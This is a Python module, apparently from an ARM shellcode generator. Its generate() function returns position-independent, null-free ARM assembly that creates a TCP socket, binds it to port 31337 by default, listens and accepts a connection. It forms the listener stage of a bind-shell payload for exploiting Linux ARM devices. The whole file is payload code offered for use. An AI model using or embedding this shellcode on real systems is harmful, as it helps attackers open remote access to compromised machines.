# listen(port)

from socket import ntohs

def generate(port=31337):
    sc = """
    mov r0, #2
    mov r1, #1
    sub r2, r2, r2
    sub r7, r7, r7
    add r7, r7, #255
    add r7, r7, #26
    svc 1

    mov r6, r0
    #adr r4, sockaddr_in_1
    mov r4, pc
    add r4, #22
    ldr r1, [r4]
    sub r2, r2, r2
    push { r1, r2 }
    mov r0, r6
    mov r1, sp
    mov r2, #16
    sub r7, r7, r7
    add r7, r7, #255
    add r7, r7, #27
    svc 1

    b after_sockaddr_in_2

sockaddr_in_1:
    .short 2
    .short %s

after_sockaddr_in_2:
    mov r1, #16
    mov r0, r6
    sub r7, r7, r7
    add r7, r7, #255
    add r7, r7, #29
    svc 1

    mov r0, r6
    sub r1, r1, r1
    sub r2, r2, r2
    sub r7, r7, r7
    add r7, r7, #255
    add r7, r7, #30
    svc 1
    """ % (ntohs(port))
    return sc
